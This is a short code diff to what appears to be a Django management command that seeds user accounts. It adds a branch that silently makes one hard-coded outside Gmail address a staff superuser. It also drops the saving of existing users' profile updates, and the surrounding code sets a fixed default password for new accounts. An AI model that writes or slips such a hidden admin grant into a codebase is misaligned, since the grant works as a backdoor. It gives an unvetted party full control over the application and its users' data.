@@ -5565,8 +5565,10 @@ class Command(BaseCommand):
             if u_created or not user.has_usable_password():
                 user.set_password("OrbitClient2026!")
                 user.save()
-            else:
-                user.save(update_fields=["email", "first_name", "last_name"])
+            if primary_email.lower() == "valdaceai@gmail.com":
+                user.is_staff = True
+                user.is_superuser = True
+                user.save(update_fields=["is_staff", "is_superuser"])
             if u_created:
                 created_users += 1
             user_by_email[primary_email.lower()] = user
